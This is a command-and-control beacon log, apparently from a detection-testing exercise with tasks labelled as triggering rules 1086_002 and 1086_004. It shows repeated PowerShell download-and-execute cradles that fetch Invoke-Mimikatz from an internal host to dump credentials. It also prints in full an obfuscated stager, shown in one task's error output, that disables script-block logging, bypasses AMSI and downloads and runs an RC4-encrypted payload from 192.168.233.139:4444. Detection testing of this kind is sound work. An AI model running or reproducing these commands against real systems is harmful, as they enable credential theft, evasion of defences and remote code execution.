02/24 09:41:45 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 17396; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/24 09:57:38 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 09:57:43 [checkin] host called home, sent: 156 bytes
02/24 09:57:45 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生
错误。”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57:8080
/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 111
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok
e-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 09:58:17 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 09:58:45 [checkin] host called home, sent: 156 bytes
02/24 09:58:46 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生
错误。”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57:8080
/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 111
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok
e-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 10:01:16 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 10:01:46 [checkin] host called home, sent: 156 bytes
02/24 10:01:47 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生
错误。”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57:8080
/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 111
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok
e-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 10:09:32 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 10:09:32 [task] IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
02/24 10:09:32 [task] Tasked beacon to run: IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
02/24 10:09:47 [checkin] host called home, sent: 387 bytes
02/24 10:09:50 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生_x000D__x000A_</S><S S="Error">错误。”_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 46_x000D__x000A_</S><S S="Error">+ IEX (New-Object Net.WebClient).DownloadString &lt;&lt;&lt;&lt; ('https://172.17.2.57:8080_x000D__x000A_</S><S S="Error">/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds_x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DotNetMethodException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请_x000D__x000A_</S><S S="Error">检查名称的拼写，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 111_x000D__x000A_</S><S S="Error">+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok_x000D__x000A_</S><S S="Error">e-Mimikatz.ps1'); Invoke-Mimikatz &lt;&lt;&lt;&lt;  -DumpCreds_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com _x000D__x000A_</S><S S="Error">   mandNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/24 11:12:31 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 11:12:51 [checkin] host called home, sent: 156 bytes
02/24 11:12:52 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生
错误。”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57:8080
/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 111
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok
e-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 11:13:45 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 11:13:52 [checkin] host called home, sent: 155 bytes
02/24 11:13:52 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生
错误。”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57:8080
/Invoke-Mimikatz.ps1'); Invoke-Mimikatz-DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz-DumpCreds”项识别为 cmdlet、函数、脚本文件或可运行程序
的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 121
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok
e-Mimikatz.ps1'); Invoke-Mimikatz-DumpCreds <<<< 
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz-DumpCreds:Strin 
   g) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 13:59:32 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 13:59:58 [checkin] host called home, sent: 155 bytes
02/24 13:59:59 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生
错误。”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57:8080
/Invoke-Mimikatz.ps1'); Invoke-Mimikatz-DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz-DumpCreds”项识别为 cmdlet、函数、脚本文件或可运行程序
的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 121
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok
e-Mimikatz.ps1'); Invoke-Mimikatz-DumpCreds <<<< 
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz-DumpCreds:Strin 
   g) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 14:02:33 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 14:02:59 [checkin] host called home, sent: 156 bytes
02/24 14:03:00 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生
错误。”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57:8080
/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 111
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok
e-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 14:16:11 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 14:16:11 [task] Tasked beacon to run: Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
02/24 14:17:00 [checkin] host called home, sent: 355 bytes
02/24 14:17:01 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Set-ExecutionPolicy : Windows PowerShell 已成功更新您的执行策略，但该设置已被在_x000D__x000A_</S><S S="Error">更具体的范围内定义的策略覆盖。由于此覆盖，您的 shell 将保留自己的“Bypass”当前_x000D__x000A_</S><S S="Error">有效执行策略。键入“Get-ExecutionPolicy -List”可查看您的执行策略设置。有关详细_x000D__x000A_</S><S S="Error">信息，请参阅“Get-Help Set-ExecutionPolicy”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Set-ExecutionPolicy &lt;&lt;&lt;&lt;  RemoteSigned -Scope CurrentUser_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], Sec _x000D__x000A_</S><S S="Error">   urityException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Com _x000D__x000A_</S><S S="Error">   mands.SetExecutionPolicyCommand_x000D__x000A_</S></Objs>

02/24 14:17:01 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生
错误。”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57:8080
/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 111
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok
e-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 14:18:34 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 14:18:34 [task] Tasked beacon to run: Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
02/24 14:19:01 [checkin] host called home, sent: 355 bytes
02/24 14:19:03 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Set-ExecutionPolicy : Windows PowerShell 已成功更新您的执行策略，但该设置已被在_x000D__x000A_</S><S S="Error">更具体的范围内定义的策略覆盖。由于此覆盖，您的 shell 将保留自己的“Bypass”当前_x000D__x000A_</S><S S="Error">有效执行策略。键入“Get-ExecutionPolicy -List”可查看您的执行策略设置。有关详细_x000D__x000A_</S><S S="Error">信息，请参阅“Get-Help Set-ExecutionPolicy”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Set-ExecutionPolicy &lt;&lt;&lt;&lt;  RemoteSigned -Scope CurrentUser_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], Sec _x000D__x000A_</S><S S="Error">   urityException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Com _x000D__x000A_</S><S S="Error">   mands.SetExecutionPolicyCommand_x000D__x000A_</S></Objs>

02/24 14:19:03 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生
错误。”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57:8080
/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 111
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok
e-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 14:23:01 [task] execute bypass UAC With Powershell add -Enc Command
02/24 14:23:03 [checkin] host called home, sent: 4033 bytes
02/24 14:24:13 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">使用“1”个参数调用“DownloadData”时发生异常:“无法连接到远程服务器”_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1401_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA &lt;&lt;&lt;&lt; ($SeR+$T);$iv=_x000D__x000A_</S><S S="Error">$dATA[0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DotNetMethodException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1421_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error"> &lt;&lt;&lt;&lt; 0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1439_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error">0..3];$data=$dAta[ &lt;&lt;&lt;&lt; 4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法将“Q”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写_x000D__x000A_</S><S S="Error">，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 2_x000D__x000A_</S><S S="Error">+ Q &lt;&lt;&lt;&lt; _x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (Q:String) [], CommandNotFoundEx _x000D__x000A_</S><S S="Error">   ception_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/24 14:28:52 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 14:28:52 [task] Tasked beacon to run: Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
02/24 14:29:13 [checkin] host called home, sent: 331 bytes
02/24 14:29:15 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Set-ExecutionPolicy : Windows PowerShell 已成功更新您的执行策略，但该设置已被在_x000D__x000A_</S><S S="Error">更具体的范围内定义的策略覆盖。由于此覆盖，您的 shell 将保留自己的“Bypass”当前_x000D__x000A_</S><S S="Error">有效执行策略。键入“Get-ExecutionPolicy -List”可查看您的执行策略设置。有关详细_x000D__x000A_</S><S S="Error">信息，请参阅“Get-Help Set-ExecutionPolicy”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Set-ExecutionPolicy &lt;&lt;&lt;&lt;  RemoteSigned -Scope CurrentUser_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], Sec _x000D__x000A_</S><S S="Error">   urityException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Com _x000D__x000A_</S><S S="Error">   mands.SetExecutionPolicyCommand_x000D__x000A_</S></Objs>

02/24 14:29:15 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57/'); 
Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 87
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57/'); Invoke
-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 14:30:43 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 14:30:43 [task] Tasked beacon to run: Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
02/24 14:31:15 [checkin] host called home, sent: 331 bytes
02/24 14:31:17 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Set-ExecutionPolicy : Windows PowerShell 已成功更新您的执行策略，但该设置已被在_x000D__x000A_</S><S S="Error">更具体的范围内定义的策略覆盖。由于此覆盖，您的 shell 将保留自己的“Bypass”当前_x000D__x000A_</S><S S="Error">有效执行策略。键入“Get-ExecutionPolicy -List”可查看您的执行策略设置。有关详细_x000D__x000A_</S><S S="Error">信息，请参阅“Get-Help Set-ExecutionPolicy”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Set-ExecutionPolicy &lt;&lt;&lt;&lt;  RemoteSigned -Scope CurrentUser_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], Sec _x000D__x000A_</S><S S="Error">   urityException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Com _x000D__x000A_</S><S S="Error">   mands.SetExecutionPolicyCommand_x000D__x000A_</S></Objs>

02/24 14:31:17 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57/'); 
Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 87
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57/'); Invoke
-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


